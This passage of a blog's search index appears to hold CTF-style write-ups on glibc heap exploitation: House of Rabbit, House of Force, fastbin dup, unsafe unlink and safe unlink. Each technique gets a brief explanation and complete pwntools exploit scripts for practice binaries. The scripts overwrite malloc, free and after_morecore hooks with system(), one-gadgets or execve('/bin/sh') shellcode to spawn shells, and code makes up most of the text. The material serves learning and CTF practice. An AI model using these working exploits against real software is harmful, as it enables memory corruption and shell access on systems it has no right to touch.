env={\u0026#34;LD_LIBRARY_PATH\u0026#34;: libc.path}) index = 0 # Select the \u0026#34;malloc\u0026#34; option; send size \u0026amp; data. # Returns chunk index. def malloc(size, data): global index io.send(b\u0026#34;1\u0026#34;) io.sendafter(b\u0026#34;size: \u0026#34;, f\u0026#34;{size}\u0026#34;.encode()) io.sendafter(b\u0026#34;data: \u0026#34;, data) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) index += 1 return index - 1 # Select the \u0026#34;free\u0026#34; option; send index. def free(index): io.send(b\u0026#34;2\u0026#34;) io.sendafter(b\u0026#34;index: \u0026#34;, f\u0026#34;{index}\u0026#34;.encode()) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) # Select the \u0026#34;amend age\u0026#34; option; send new value. def amend_age(age): io.send(b\u0026#34;3\u0026#34;) io.sendafter(b\u0026#34;age: \u0026#34;, f\u0026#34;{age}\u0026#34;.encode()) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) # Calculate the \u0026#34;wraparound\u0026#34; distance between two addresses. def delta(x, y): return (0xffffffffffffffff - x) + y io = start() # This binary leaks the address of puts(), use it to resolve the libc load address. io.recvuntil(b\u0026#34;puts() @ \u0026#34;) libc.address = int(io.recvline(), 16) - libc.sym.puts io.timeout = 0.1 # ============================================================================= # =-=-=- PREPARE A FAKE CHUNK -=-=-= # Craft a fake chunk using the \u0026#34;age\u0026#34; field. # Set its prev_inuse flag to avoid backward consolidation. # This fake chunk has a size of 0, so it acts as its own forward consolidation guard. age = 1 io.sendafter(b\u0026#34;age: \u0026#34;, f\u0026#34;{age}\u0026#34;.encode()) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) # =-=-=- INCREASE MMAP THRESHOLD -=-=-= # Before we can increase the main arena\u0026#39;s system_mem value, we must increase the mmap_threshold. # We do this by requesting then freeing a chunk with size beyond the mmap threshold. mem = malloc(0x5fff8, b\u0026#34;Y\u0026#34;*8) # Allocated via mmap(). free(mem) # Freeing an mmapped chunk increases the mmap threshold to its size. # =-=-=- INCREASE SYSTEM_MEM -=-=-= # Now that the mmap threshold is beyond 0x60000, requesting chunks of that size will allocate them # from a heap, rather than via mmap(). # This in turn will increase the total memory checked out from the kernel, which is tracked by # an arena\u0026#39;s system_mem field. mem = malloc(0x5fff8, b\u0026#34;Z\u0026#34;*8) # =-=-=- LINK FAKE CHUNK INTO A FASTBIN -=-=-= # We can\u0026#39;t request fast-sized chunks! # Instead, forge one on the heap using vestigial malloc metadata, then free it via a dangling pointer. # Prepare dangling pointer. chunk_A = malloc(0x88, b\u0026#34;A\u0026#34;*8) dangling_pointer = malloc(0x88, b\u0026#34;B\u0026#34;*8) # Dangling pointer. free(chunk_A) free(dangling_pointer) # Coerce a 0x20 size field onto the heap, lined up with the dangling pointer. chunk_C = malloc(0xa8, b\u0026#34;C\u0026#34;*8) chunk_D = malloc(0x88, b\u0026#34;D\u0026#34;*8) # Guard against top consolidation. free(chunk_C) chunk_E = malloc(0x88, b\u0026#34;E\u0026#34;*8) # Remainder chunk_C, leaving a free 0x20 chunk. # Free chunk E to consolidate it with the unsorted 0x20 chunk, avoiding unlinking problems later. free(chunk_E) # Consolidate everything with the top chunk, we need to request the space overlapping the 0x20 chunk. free(chunk_D) # Free the dangling pointer, the size field at that location is 0x20, vestigial malloc metadata. free(dangling_pointer) # Double-free. # Request a chunk overlapping the free 0x20 chunk and overwrite its fd with the address # of our fake chunk. chunk_F = malloc(0x88, b\u0026#34;F\u0026#34;*8) overlap = malloc(0x88, pack(elf.sym.user)) # =-=-=- CONSOLIDATE FAKE CHUNK INTO UNSORTEDBIN -=-=-= # Free the 0x60000 chunk, which is large enough to trigger malloc_consolidate(). # Previously we did this by requesting then freeing a normal chunk bordering the top. free(mem) # =-=-=- SORT FAKE CHUNK INTO BIN 126 -=-=-= # Sort the fake chunk into bin 126 by setting its size to the minimum required to qualify for it, # then requesting a chunk larger than the fake chunk. # This part is where the unsortedbin size sanity check would catch us if we hadn\u0026#39;t increased system_mem. amend_age(0x80001) malloc(0x80008, b\u0026#34;G\u0026#34;*8) # Increase the fake chunk size so that it can reach the after_morecore hook. # Making this value too large will fail the size sanity check during unsortedbin allocation # of the following chunk. It can also trigger segfaults or busfaults when the remaindering code # attempts to update the prev_size field of the succeeding chunk. distance = (libc.sym.__after_morecore_hook - 0x20) - elf.sym.user amend_age(distance + 0xa1) # Leave just enough space in the remainder to request a small chunk overlapping the hook. # =-=-=- OVERWRITE HOOK -=-=-= # The next request is serviced by our fake chunk. # Request a large chunk to bridge the gap between the fake chunk and the hook. # We can\u0026#39;t target the free hook this time because we can only write 8 bytes into chunk user data # rather than 16, meaning we can\u0026#39;t make up the gap between the start of a chunk overlapping # the free hook and the free hook itself. # The malloc hook gets clobbered too early by inline metadata, and we don\u0026#39;t have enough control # over __morecore arguments, nor does it satisfy any one-gadget constraints. # However, we can trigger the after_morecore hook and it satisfies a one-gadget constraint. malloc(distance, b\u0026#34;H\u0026#34;*8) # The next request is serviced by the fake chunk\u0026#39;s remainder and overlaps the after_morecore hook. # Use it to overwrite the after_morecore hook with the address of a one-gadget. malloc(0x88, pack(libc.address + 0x3ff5e)) # rax == NULL # Request enough space to trigger top chunk extension. Remember that there\u0026#39;s a 0x60000-sized chunk in # the unsortedbin at this point so we need to request more than that, but no more than the mmap threshold. malloc(0x60008, b\u0026#34;\u0026#34;) # ============================================================================= io.interactive() ","date":"2024-06-28T00:00:00Z","image":"https://demo.stack.jimmycai.com/p/the-house-of-rabbit/cover_hu9d8857c717d96ad2f86768a20d874436_10244_120x120_fill_q75_box_smart1.jpg","permalink":"https://demo.stack.jimmycai.com/p/the-house-of-rabbit/","title":"The House of Rabbit"},{"content":"House of force Overall When a program allocates memory from the heap, the operating system allocates a block of physical memory (or a combination of physical and disk memory) and assigns a virtual address to it. This virtual address becomes part of the process\u0026rsquo;s virtual address space and can be used by the program to access the allocated memory.\nVirtual Memory (VA) It\u0026rsquo;s a memory management technique employed by operating systems to provide processes with the illusion of having more contiguous physical memory (RAM) than is actually available. The operating system maintains a translation table that maps virtual addresses used by a process to physical addresses in RAM or on secondary storage (like a hard disk). This allows processes to use more memory than physically present by swapping data between RAM and disk as needed. Heap The heap is a region of memory within a process\u0026rsquo;s virtual address space. It\u0026rsquo;s managed dynamically during program execution. Programs can allocate and deallocate memory from the heap using functions like malloc (allocate) and free (deallocate) in C/C++. The heap is typically used to store dynamically allocated objects or data structures whose size is not known at compile time. The heap itself is not a separate address space. It exists within the process\u0026rsquo;s virtual address space managed by the operating system\u0026rsquo;s virtual memory mechanism. In GLIBC versions \u0026lt; 2.29, top chunk size fields are not subject to any integrity checks during allocations. If a top chunk size field is overwritten using e.g. an overflow and replaced with a large value, subsequent allocations from that top chunk can overlap in-use memory. Very large allocations from a corrupted top chunk can wrap around the VA space in GLIBC versions \u0026lt; 2.30.\nFor example, a top chunk starts at address 0x405000 and target data residing at address 0x404000 in the program’s data section must be overwritten. Overwrite the top chunk size field using a bug, replacing it with the value 0xfffffffffffffff1. Next, calculate the number of bytes needed to move the top chunk to an address just before the target. The total is 0xffffffffffffffff - 0x405000 bytes to reach the end of the VA space, then 0x404000 - 0x20 more bytes to stop just short of the target address. Approach Overwrite a top chunk size field with a large value, then request enough memory to bridge the gap between the top chunk and target data. Allocations made in this way can wrap around the VA space, allowing this technique to target memory at a lower address than the heap.\nEach of malloc\u0026rsquo;s core functions, such as malloc() and free(), has an associated hook which takes the form of a writable function pointer in GLIBC\u0026rsquo;s data section. Under normal circumstances these hooks can be used by developers to do things like implement theirown memory allocators or to collect malloc statistics.\nFurther use If the target resides on the same heap as the corrupt top chunk, leaking a heap address is not required, the allocation can wrap around the VA space back onto the same heap to an address relative to the top chunk.\nThe malloc hook is a viable target for this technique because passing arbitrarily large requests to malloc() is a prerequisite of the House of Force. Overwriting the malloc hook with the address of system(), then passing the address of a “/bin/sh” string to malloc masquerading as the request size becomes the equivalent of system(“/bin/sh”).\nLimitations GLIBC version 2.29 introduced a top chunk size field sanity check, which ensures that the top chunk size does not exceed its arena’s system_mem value. GLIBC version 2.30 introduced a maximum allocation size check, which limits the size of the gap the House of Force can bridge. Script overwritetarget.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./house_of_force\u0026#39;, checksec=False) libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+295 b *main+448 \u0026#34;\u0026#34;\u0026#34; def info(mes): return log.info(mes) def start(): if args.GDB: return gdb.debug(elf.path, env={\u0026#34;LD_PRELOAD\u0026#34;: libc.path} ,gdbscript=gs) else: return process(elf.path) def malloc(io, size, data): io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.send(b\u0026#39;1\u0026#39;) io.recvuntil(b\u0026#39;size: \u0026#39;) io.send(f\u0026#39;{size}\u0026#39;.encode()) io.recvuntil(b\u0026#39;data: \u0026#39;) io.send(data) def delta(x, y): return (0xffffffffffffffff - x) + y io = start() io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts_leak = int(io.recvn(14), 16) io.recvuntil(b\u0026#39;heap @ \u0026#39;) heap_leak = int(io.recvn(8), 16) info(\u0026#34;The address of puts:: \u0026#34;+ hex(puts_leak)) info(\u0026#34;The address of heap: \u0026#34; + hex(heap_leak)) distance = delta(heap_leak + 0x20, elf.sym[\u0026#39;target\u0026#39;] - 0x20) malloc(io, 24, b\u0026#39;a\u0026#39;*24 + p64(0xffffffffffffffff)) malloc(io, distance, b\u0026#39;oke\u0026#39;) malloc(io, 24, b\u0026#39;You win\u0026#39;) io.interactive() shell.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./house_of_force\u0026#39;, checksec=False) libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+295 b *main+448 \u0026#34;\u0026#34;\u0026#34; def info(mes): return log.info(mes) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path) def malloc(io, size, data): io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.send(b\u0026#39;1\u0026#39;) io.recvuntil(b\u0026#39;size: \u0026#39;) io.send(f\u0026#39;{size}\u0026#39;.encode()) io.recvuntil(b\u0026#39;data: \u0026#39;) io.send(data) io = start() io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts_leak = int(io.recvn(14), 16) libc.address = puts_leak - libc.sym[\u0026#39;puts\u0026#39;] io.recvuntil(b\u0026#39;heap @ \u0026#39;) io.timeout = 0.1 #important heap_leak = int(io.recvn(8), 16) info(\u0026#34;The address of puts:: \u0026#34;+ hex(puts_leak)) info(\u0026#34;The address of heap: \u0026#34; + hex(heap_leak)) info(\u0026#34;The address of libc: \u0026#34; + hex(libc.address)) distance = libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 0x20 - (heap_leak + 0x20) malloc(io, 24, b\u0026#39;a\u0026#39;*24 + p64(0xffffffffffffffff)) malloc(io, distance, b\u0026#39;/bin/sh\\x00\u0026#39;) malloc(io, 24, p64(libc.sym[\u0026#39;system\u0026#39;])) #Option 1 #cmd = heap_leak + 0x30 #the address save \u0026#34;/bin/sh\u0026#34; #malloc(io, cmd, b\u0026#39;\u0026#39;) #Option 2 cmd = next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;)) malloc(io, cmd, b\u0026#39; \u0026#39;) io.interactive() Fastbin dup Overall The fastbin double-free check only ensures that a chunk being freed into a fastbin is not already the first chunk in that bin, if a different chunk of the same size is freed between the double-free then the check passes.\nFor example, request chunks A \u0026amp; B, both of which are the same size and qualify for the fastbins when freed, then free chunk A. If chunk A is freed again immediately, the fastbin double-free check will fail because chunk A is already the first chunk in that fastbin. Instead, free chunk B, then free chunk A again. This way chunk B is the first chunk in that fastbin when chunk A is freed for the second time. Now request three chunks of the same size as A \u0026amp; B, malloc will return chunk A, then chunk B, then chunk A again.\nThis may yield an opportunity to read from or write to a chunk that is allocated for another purpose. Alternatively, it could be used to tamper with fastbin metadata, specifically the forward pointer (fd) of the double-freed chunk. This may allow a fake chunk to be linked into the fastbin which can be allocated, then used to read from or write to an arbitrary location. Fake chunks allocated in this way must pass a size field check which ensures their size field value matches the chunk size of the fastbin they are being allocated from.\nWatch out for incompatible flags in fake size fields, a set NON_MAIN_ARENA flag with a clear CHUNK_IS_MMAPPED flag can cause a segfault as malloc attempts to locate a non-existent arena.\nApproach Leverage a double-free bug to coerce malloc into returning the same chunk twice, without freeing it in between. This technique is typically capitalised upon by corrupting fastbin metadata to link a fake chunk into a fastbin. This fake chunk can be allocated, then program functionality could be used to read from or write to an arbitrary memory location.\nFurther use The malloc hook is a good target for this technique, the 3 most-significant bytes of the _IO_wide_data_0 vtable pointer can be used in conjunction with part of the succeeding padding quadword to form a reliable 0x7f size field.\nThis works because allocations are subject neither to alignment checks nor to flag corruption checks. Limitations The fastbin size field check during allocation limits candidates for fake chunks.\nFastbin dup 1 overwrite.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./fastbin_dup\u0026#39;, checksec=False) libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; \u0026#34;\u0026#34;\u0026#34; index = 0 def start(): if args.GDB: return gdb.debug(elf.path,env={\u0026#34;LD_PRELOAD\u0026#34;: libc.path} ,gdbscript=gs) else: return process(elf.path) def send_name(name): io.sendafter(b\u0026#39;Enter your username: \u0026#39;, name) def info(mes): return log.info(mes) def malloc(size, data): global index io.send(b\u0026#39;1\u0026#39;) io.sendafter(b\u0026#39;size: \u0026#39;, f\u0026#39;{size}\u0026#39;.encode()) io.sendafter(b\u0026#39;data: \u0026#39;, data) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) index += 1 return index -1 def free(index): io.send(b\u0026#39;2\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, f\u0026#39;{index}\u0026#39;.encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io = start() io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts_leak = int(io.recvline(), 16) send_name(p64(0) + p64(0x31)) info(\u0026#34;puts in libc: \u0026#34; + hex(puts_leak)) chunk_A = malloc(0x28, b\u0026#39;a\u0026#39;*0x28) chunk_B = malloc(0x28, b\u0026#39;b\u0026#39;*0x28) free(chunk_A) free(chunk_B) free(chunk_A) dup = malloc(0x28, p64(elf.sym[\u0026#39;user\u0026#39;])) malloc(0x28, b\u0026#39;c\u0026#39;*0x28) malloc(0x28, b\u0026#39;d\u0026#39;*0x28) malloc(0x28, b\u0026#39;You win\u0026#39;) io.interactive() shell.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./fastbin_dup\u0026#39;, checksec=False) libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+319 b *main+492 b *main+598 \u0026#34;\u0026#34;\u0026#34; index = 0 def info(mes): return log.info(mes) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path) def send_name(name): io.sendafter(b\u0026#39;Enter your username: \u0026#39;, name) def malloc(size, data): global index io.send(b\u0026#39;1\u0026#39;) io.sendafter(b\u0026#39;size: \u0026#39;, f\u0026#39;{size}\u0026#39;.encode()) io.sendafter(b\u0026#39;data: \u0026#39;, data) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) index += 1 return index -1 def free(id): io.send(b\u0026#39;2\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, f\u0026#39;{id}\u0026#39;.encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io = start() io.timeout = 0.1 io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts_leak = int(io.recvline(), 16) info(\u0026#34;puts in libc: \u0026#34; + hex(puts_leak)) libc.address = puts_leak - libc.sym[\u0026#39;puts\u0026#39;] info(\u0026#34;libc: \u0026#34; + hex(libc.address)) send_name(b\u0026#39;Broder\u0026#39;) chunk_A = malloc(0x68, b\u0026#39;a\u0026#39;*0x68) chunk_B = malloc(0x68, b\u0026#39;b\u0026#39;*0x68) free(chunk_A) free(chunk_B) free(chunk_A) dup = malloc(0x68, p64(libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 35)) malloc(0x68, b\u0026#39;c\u0026#39;*0x68) malloc(0x68, b\u0026#39;d\u0026#39;*0x68) malloc(0x68, b\u0026#39;a\u0026#39;*19 + p64(libc.address + 0xe1fa1)) io.interactive() Fastbin dup 2 This binary challenge doesn\u0026rsquo;t allow request 0x68 size\nshell.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./fastbin_dup_2\u0026#39;,checksec=False) libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+235 b *main+401 b *main+503 \u0026#34;\u0026#34;\u0026#34; #b *main+298 b *main+473 index = 0 def info(mes): return log.info(mes) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path) def malloc(size, data): global index io.send(b\u0026#39;1\u0026#39;) io.sendafter(b\u0026#39;size: \u0026#39;, f\u0026#39;{size}\u0026#39;.encode()) io.sendafter(b\u0026#39;data: \u0026#39;, data) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) index += 1 return index -1 def free(id): io.send(b\u0026#39;2\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, f\u0026#39;{id}\u0026#39;.encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io = start() #io.timeout = 0.1 io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts_leak = int(io.recvline(), 16) libc.address = puts_leak - libc.sym[\u0026#39;puts\u0026#39;] info(\u0026#34;puts: \u0026#34; + hex(puts_leak)) info(\u0026#34;libc: \u0026#34; + hex(libc.address)) #=========================================================================================== \u0026#34;\u0026#34;\u0026#34;\u0026#34; Fake chunk in main arena to generate valide chunk size field \u0026#34;\u0026#34;\u0026#34; chunk_A = malloc(0x48, b\u0026#39;a\u0026#39;*0x48) chunk_B = malloc(0x48, b\u0026#39;b\u0026#39;*0x48) free(chunk_A) free(chunk_B) free(chunk_A) malloc(0x48, p64(0x61)) #request to 0x61 move to the head of fastbins(also it is in arena) malloc(0x48, b\u0026#39;c\u0026#39;*0x48) malloc(0x48, b\u0026#39;d\u0026#39;*0x48) \u0026#34;\u0026#34;\u0026#34; Link to main_arena to create fake chunk \u0026#34;\u0026#34;\u0026#34; dup_A = malloc(0x58, b\u0026#39;d\u0026#39;*0x48) dup_B = malloc(0x58, b\u0026#39;e\u0026#39;*0x48) free(dup_A) free(dup_B) free(dup_A) #Link to main_arena malloc(0x58, p64(libc.sym[\u0026#39;main_arena\u0026#39;] + 0x20)) malloc(0x58, b\u0026#39;-p\\x00\u0026#39;) #malloc(0x58, b\u0026#39;f\u0026#39;*0x58) #malloc(0x58, b\u0026#39;g\u0026#39;*0x58) malloc(0x58, b\u0026#39;-s\\x00\u0026#39;) \u0026#34;\u0026#34;\u0026#34; write to main_arena \u0026#34;\u0026#34;\u0026#34; # byte \\x00 ensure not ovewrite to other fastbins malloc(0x58, b\u0026#39;\\x00\u0026#39;*48 + p64(libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 35)) malloc(0x28, p8(0)*19 + p64(libc.address + 0xe1fa1)) malloc(0x18, b\u0026#39;\u0026#39;) io.interactive() Unsafe unlink Overall During chunk consolidation the chunk already linked into a free list is unlinked from that list via the unlink macro. The unlinking process is a reflected WRITE using the chunk’s forward (fd) and backward (bk) pointers The victim bk is copied over the bk of the chunk pointed to by the victim fd. The victim fd is written over the fd of the chunk pointed to by the victim bk. If a chunk with designer controlled fd \u0026amp; bk pointers is unlinked, this write can be manipulated. One way to achieve this is via an overflow into a chunk’s size field, which is used to CLEAR its prev_inuse bit. When the chunk with the clear prev_inuse bit is freed, malloc will attempt to consolidate it backwards. A designer-supplied prev_size field can aim this consolidation attempt at an allocated chunk where counterfeit fd \u0026amp; bk pointers reside. For example Request chunks A \u0026amp; B, chunk A overflows into chunk B’s size field and chunk B is outside fastbin size range. Prepare counterfeit fd \u0026amp; bk pointers within chunk A, the fd points at the free hook – 0x18 and the bk points to shellcode prepared elsewhere. Prepare a prev_size field for chunk B that would cause a backward consolidation attempt to operate on the counterfeit fd \u0026amp; bk. Leverage the overflow to clear chunk B’s prev_inuse bit. When chunk B is freed the clear prev_inuse bit in its size field causes malloc to read chunk B’s prev_size field and unlink the chunk that many bytes behind it. When the unlink macro operates on the counterfeit fd \u0026amp; bk pointers, it writes the address of the shellcode to the free hook and the address of the free hook – 0x18 into the 3rd quadword of the shellcode. The shellcode can use a jump instruction to skip the bytes corrupted by the fd. Triggering a call to free() executes the shellcode.\nApproach Force the unlink macro to process designer-controlled fd/bk pointers, leading to a reflected write. Further use It is possible to use a prev_size field of 0 and craft the counterfeit fd \u0026amp; bk pointers within chunk. The same technique can be applied to forward consolidation but requires stricter heap control.\nLimitations This technique can only be leveraged against GLIBC versions \u0026lt;= 2.3.3, safe unlinking was introduced in GLIBC version 2.3.4 in 2004 and GLIBC versions that old are not common. This technique was originally leveraged against platforms without NX/DEP and is described as such here. In 2003 AMD introduced hardware NX support to their consumer desktop processors, followed by Intel in 2004, systems without this protection are not common.\nScript shell.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./unsafe_unlink\u0026#39;, checksec=False) libc = ELF(\u0026#39;../.glibc/glibc_2.23_unsafe-unlink/libc.so.6\u0026#39;, checksec=False) #libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+265 b *main+382 b *main+656 b *main+717 b *main+787 \u0026#34;\u0026#34;\u0026#34; index = 0 def info(mes): return log.info(mes) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path) def malloc(size): global index io.send(b\u0026#39;1\u0026#39;) io.sendafter(b\u0026#39;size: \u0026#39;, str(size).encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) index += 1 return index - 1 def edit(index, data): io.send(b\u0026#39;2\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.sendafter(b\u0026#39;data: \u0026#39;, data) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def free(index): io.send(b\u0026#39;3\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def exit(): io.send(b\u0026#39;4\u0026#39;) io = start() #io.timeout = 0.1 io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts = int(io.recvline(), 16) io.recvuntil(b\u0026#39;heap @ \u0026#39;) heap = int(io.recvline(), 16) libc.address = puts - libc.sym[\u0026#39;puts\u0026#39;] info(\u0026#34;puts: \u0026#34; + hex(puts)) info(\u0026#34;libc base: \u0026#34; + hex(libc.address)) info(\u0026#34;heap: \u0026#34; + hex(heap)) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) chunk_a = malloc(0x88) chunk_b = malloc(0x88) fd_pointer = libc.sym[\u0026#39;__free_hook\u0026#39;] - 0x18 bk_pointer = heap + 0x20 shellcode = asm(\u0026#34;jmp shellcode;\u0026#34; + \u0026#34;nop;\u0026#34;*0x30 + \u0026#34;shellcode:\u0026#34; + shellcraft.execve(\u0026#34;/bin/sh\u0026#34;)) zero_null = p8(0)*(0x88 - len(shellcode) - 8*3) prev_size = p64(0x90) size_B = p64(0x90) payload = p64(fd_pointer) payload += p64(bk_pointer) payload += shellcode payload += zero_null payload += prev_size payload += size_B edit(chunk_a, payload) free(chunk_b) #free(chunk_a) io.interactive() Safe unlink Overall The Safe Unlink technique is similar to the Unsafe Unlink, but accounts for safe unlinking checks introduced in GLIBC version 2.3.4. The safe unlinking checks ensure that a chunk is part of a doubly linked list before unlinking it. - The checks PASS if the bk of the chunk pointed to by the victim chunk’s fd points back to the victim chunk, and the fd of the chunk pointed to by the victim’s bk also points back to the victim chunk.\nForge a fake chunk starting at the first quadword of a legitimate chunk’s user data, point its fd \u0026amp; bk 0x18 and 0x10 bytes respectively before a user data pointer to the chunk in which they reside. Craft a prev_size field for the succeeding chunk that is 0x10 bytes less than the actual size of the previous chunk. Leverage an overflow bug to clear the succeeding chunk’s prev_inuse bit, when this chunk is freed malloc will attempt to consolidate it backwards with the fake chunk.\nThe bk of the chunk pointed to by the fake chunk’s fd points back to the fake chunk, and the fd of the chunk pointed to by the fake chunk’s bk also points back to the fake chunk, satisfying the safe unlinking checks.\nThe RESULT of the unlinking process is that the pointer to the fake chunk (a pointer to a legitimate chunk’s user data) is overwritten with the address of itself minus 0x18.\nIf this pointer is used to write data, it may be used to overwrite itself a second time with the address of sensitive data, then be used to tamper with that data.\nApproach The modern equivalent of the Unsafe Unlink technique. Force the unlink macro to process designercontrolled fd/bk pointers, leading to a reflected write. The safe unlinking checks are satisfied by aiming the reflected write at a pointer to an in-use chunk. Program functionality may then be used to overwrite this pointer again, which may in turn be used to read from or write to an arbitrary address. Further use By forging a very large prev_size field the consolidation attempt may wrap around the VA space and operate on a fake chunk within the freed chunk.\nLimitations A size vs prev_size check introduced in GLIBC version 2.26 requires the fake chunk’s size field to pass a simple check; the value at the fake chunk + size field must equal the size field, setting the fake size field to 8 will always pass this check. A 2nd size vs prev_size check introduced in GLIBC version 2.29 requires the fake chunk’s size field to match the forged prev_size field.\nScript overwrite.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./safe_unlink\u0026#39;, checksec=False) libc = ELF(\u0026#39;../.glibc/glibc_2.30_no-tcache/libc.so.6\u0026#39;, checksec=False) #libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+218 b *main+326 b *main+606 b *main+735 \u0026#34;\u0026#34;\u0026#34; index = 0 def info(mes): return log.info(mes) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path) def malloc(size): global index io.send(b\u0026#39;1\u0026#39;) io.sendafter(b\u0026#39;size: \u0026#39;, str(size).encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) index += 1 return index - 1 def edit(index, data): io.send(b\u0026#39;2\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.sendafter(b\u0026#39;data: \u0026#39;, data) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def free(index): io.send(b\u0026#39;3\u0026#39;) io.sendafter(b\u0026#39;index: \u0026#39;, str(index).encode()) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def target(): io.send(b\u0026#39;4\u0026#39;) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def quit(): io.send(b\u0026#39;5\u0026#39;) io = start() io.recvuntil(b\u0026#39;puts() @ \u0026#39;) puts = int(io.recvline(), 16) libc.address = puts - libc.sym[\u0026#39;puts\u0026#39;] info(\u0026#34;libc base: \u0026#34; + hex(libc.address)) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) chunk_a = malloc(0x88) chunk_b = malloc(0x88) chunk_prev = p64(0) chunk_size = p64(0x80) fd = p64(elf.sym[\u0026#39;m_array\u0026#39;] - 0x18) bk = p64(elf.sym[\u0026#39;m_array\u0026#39;] - 0x10) nop = p8(0)*(0x88 - 8*5) fake_prev_size = p64(0x80) fake_size = p64(0x90) payload = chunk_prev + chunk_size + fd + bk + nop + fake_prev_size + fake_size edit(0, payload) free(chunk_b) overlapped_mparray = p64(0)*3 + p64(elf.sym[\u0026#39;target\u0026#39;]) edit(0, overlapped_mparray) edit(0, b\u0026#39;Much win\u0026#39;) target() io.interactive() 